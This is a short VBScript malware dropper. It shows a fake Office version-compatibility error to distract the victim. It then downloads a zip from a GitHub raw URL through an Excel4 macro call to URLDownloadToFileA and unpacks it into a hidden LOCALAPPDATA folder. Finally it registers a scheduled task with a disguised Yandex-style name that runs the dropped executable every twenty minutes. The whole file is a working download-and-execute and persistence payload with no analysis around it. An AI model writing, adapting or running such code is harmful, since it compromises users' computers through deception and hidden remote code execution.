set objShell = CreateObject("Shell.Application")
Set excelObj = CreateObject("Excel.ChartApplication")
Set shellObj = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
call shellObj.PoPup ("The format of this document is not compatible with the version of Office that you are running. Check your computer's system information to see if you need an x86 (32-bit) or x64 (64-bit) version of this document.", -1, "Error", 16)
Set EnvVar = shellObj.Environment("PROCESS")
strDirectory = EnvVar("LOCALAPPDATA") + "\sleeper_01"
objFSO.CreateFolder(strDirectory)
excelObj.visible = false
FilePath = strDirectory + "\manifest.zip"
UrlPath = "https://raw.githubusercontent.com/leachim7/hello-world/main/v/manifest.zip"
call excelObj.ExecuteExcel4Macro("CALL(""urlmon"",""URLDownloadToFileA"",""JJCCJJ"", 0, """+UrlPath+""", """+FilePath+""", 0, 0)")
WScript.Sleep 10000
set FilesInZip=objShell.NameSpace(FilePath).items
objShell.NameSpace(strDirectory).CopyHere(FilesInZip)
WScript.Sleep 10000
Commandline = "/Create /SC DAILY /TN YandexE84AC6E3495D /ST 00:30 /du 24:00 /RI 20 /F /TR %LOCALAPPDATA%\zCrashReport64.exe"
call excelObj.ExecuteExcel4Macro("CALL(""Shell32"",""ShellExecuteA"",""JJCCCJJ"", 0,""open"",""C:\Windows\System32\schtasks.exe"","""+Commandline+""",0,5)")

